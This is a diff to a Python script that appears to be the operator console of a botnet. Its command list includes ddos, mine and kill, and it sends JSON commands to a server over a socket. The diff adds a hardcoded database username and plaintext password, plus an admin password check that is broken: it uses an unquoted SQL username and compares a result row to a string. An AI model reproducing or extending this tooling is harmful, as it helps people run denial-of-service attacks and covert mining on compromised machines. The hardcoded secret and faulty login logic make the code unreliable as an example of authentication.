@@ -1,9 +1,20 @@
 import json
 import socket
 import mariadb
+from getpass import getpass
 
 SERVER_IP = ""
 SERVER_PORT = 12000
+
+conn = mariadb.connect(
+    user="111A",
+    password="26hhkx7tjb",
+    database="GControl",
+    host=SERVER_IP,
+    port=3306
+)
+
+cursor = conn.cursor()
 
 """
 Commands: help, kill, ddos, mine, status, connect
@@ -40,11 +51,17 @@ def kill(args: list) -> int:
             "ip": args[0]
         })
 
-
+    password = getpass("Enter password: ")
+    cursor.execute("SELECT password FROM admins WHERE username = 111A")
+    for password_ in cursor:
+        if password_ != password:
+            print("Invalid password")
+            return 0
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((SERVER_IP, SERVER_PORT))
     sock.send(request.encode())
+
 
 def terminal_help():
     for command in commands.keys():
